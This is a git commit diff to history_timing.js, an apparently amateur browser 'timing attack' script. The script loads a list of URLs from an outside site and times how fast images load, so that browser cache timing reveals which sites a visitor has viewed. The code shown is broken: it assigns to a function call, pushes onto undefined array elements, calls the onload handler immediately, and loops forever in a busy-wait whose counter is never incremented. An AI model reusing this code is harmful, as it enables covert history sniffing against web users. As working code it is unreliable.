df3d9502e13025e028fbd84f66f91a4c5a8ff9e1
unknown <Ituralde@.(none)>
2011-03-12 18:46:47 -0500

    fixed js fail

--- history_timing.js
+++ history_timing.js
@@ -31,30 +31,56 @@ url_loader = function(text_url){
 }
 
 
+
 /*timing attack*/
 
 
 	var loader = new url_loader("http://www.joeygolden.com/WebTracking/imagelist.txt");
-	var blind_run = new Array();
-	var cache_run = new Array();
+	var blind_run_start = new Array();
+	var blind_run_end = new Array();
+	var cache_run_start = new Array();
+	var cache_run_end = new Array();
+	var image_list = new Array();
+	var images_loaded_blind = 0;
+	
+	image_load_end_blind() = function(index){
+		var timer = new Date();
+		blind_run_end[index] = timer.getTime();
+	}
 	
 	for (var index in loader.url_list){
-		var run_request = new ajaxRequest();
-		var timer1 = new Date();
-		var start_time = timer1.getTime();
-		run_request.open("GET", (loader.url_list[index]), false);
-		run_request.send(null);
-		var timer2 = new Date();
-		var end_time = timer2.getTime();
-		var difference = end_time - start_time;
-		blind_run.push(difference);
+		
+		//var run_request = new ajaxRequest();
+		var timer = new Date();
+		blind_run_start[index] = timer.getTime();
+		
+		var image_blind_run = new Image();
+		image_list[index].push(image_blind_run);
+		image_blind_run.onload = image_load_end_blind(index);
+		
+		image_blind_run.src = loader.url_list[index];
+
 	}
+	
+
+
+	while (images_loaded_blind < loader.url_list.length){
+	}
+	
+	for (var index in  loader.url_list){
+		document.writeln(blind_run_end[index] - blind_run_start[index]);
+	}
+	
+	/*
+	
 	for (var index in loader.url_list){
-		var run_request = new ajaxRequest();
+		//var run_request = new ajaxRequest();
 		var timer1 = new Date();
 		var start_time = timer1.getTime();
-		run_request.open("GET", (loader.url_list[index]), false);
-		run_request.send(null);
+		
+		//run_request.open("GET", (loader.url_list[index]), false);
+		//run_request.send(null);
+		
 		var timer2 = new Date();
 		var end_time = timer2.getTime();
 		var difference = end_time - start_time;
@@ -63,4 +89,4 @@ url_loader = function(text_url){
 	for (var index in blind_run){
 		document.writeln(blind_run[index]-cache_run[index]);
 	}
-
+*/
